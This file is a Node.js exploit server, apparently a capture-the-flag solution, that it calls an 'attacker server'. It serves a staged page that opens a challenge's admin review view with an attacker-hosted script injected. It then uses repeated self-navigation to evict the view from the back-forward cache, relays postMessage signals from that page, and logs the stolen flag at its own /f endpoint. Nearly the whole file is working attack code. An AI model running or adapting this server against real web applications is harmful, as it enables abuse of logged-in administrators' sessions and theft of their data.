const http = require("node:http");
const PORT = 9975;
const CHAL = "http://localhost:3000";
const S2 = 'addEventListener("pagehide", function(){ try { top.postMessage({p:1}, "*"); top.postMessage({p:2}, "*"); } catch(e){} });';

const srv = http.createServer((req, res) => {
  const u = new URL(req.url, "http://x");
  if (u.pathname === "/f") { console.log("\n[!!!!FLAG!!!!]", decodeURIComponent(u.search.slice(1)).slice(0, 100)); res.writeHead(200); res.end(); return; }
  if (u.pathname === "/s2p.js") { res.writeHead(200, {"Content-Type":"application/javascript"}); res.end(S2); return; }
  if (u.pathname === "/stage1") {
    res.writeHead(200, {"Content-Type":"text/html"});
    res.end('<!doctype html><body>S1<script>\n' +
      'var rid = new URLSearchParams(location.search).get("rid");\n' +
      'var note = new URLSearchParams(location.search).get("note");\n' +
      // 步骤1: 弹窗打开审查界面（顶层导航带管理员 cookie），u 指向 S2
      'window.open("' + CHAL + '/review?u=http%3A%2F%2Fhost.docker.internal%3A' + PORT + '%2Fs2p.js&rid=" + rid + "&note=" + note, "REV");\n' +
      // 步骤2: 3.5 秒后主页面连续自导航，把审查页挤出 BFCache
      'var ph = new URLSearchParams(location.search).get("ph");\n' +
      'var nn = parseInt(new URLSearchParams(location.search).get("nn")||"0");\n' +
      'if (ph === "evict") {\n' +
      '  if (nn < 8) { setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=" + (nn+1); }, 120); }\n' +
      '  else { setTimeout(function(){ history.go(-10); }, 200); }\n' +
      '} else { setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=1"; }, 3500); }\n' +
      '</scr' + 'ipt></body>');
    return;
  }
  res.writeHead(404); res.end();
});
srv.listen(PORT, () => console.log("attacker server listening on port", PORT));